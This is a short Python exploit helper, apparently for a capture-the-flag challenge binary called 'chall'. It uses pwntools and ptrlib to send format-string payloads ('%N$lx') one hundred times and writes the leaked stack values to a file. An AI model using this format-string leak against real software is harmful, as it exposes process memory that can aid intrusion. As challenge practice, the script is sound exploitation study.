#!/usr/bin/env python
import ptrlib as ptr
import pwn
import sys

elf = ptr.ELF("./chall")
pwn.context.binary = pwn.ELF("./chall", checksec=False)


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    dump = ""

    for i in range(100):
        io = connect()
        pl = "A" * 8
        pl += f"#%{i + 1}$lx#"
        io.sendlineafter("> ", pl)
        io.recvuntil("#")
        dump += f"{i+1}: 0x{io.recvuntil('#').strip(b'#').decode()}\n"
        io.close()

    with open("dump.txt", "w") as f:
        f.write(dump)


if __name__ == "__main__":
    main()
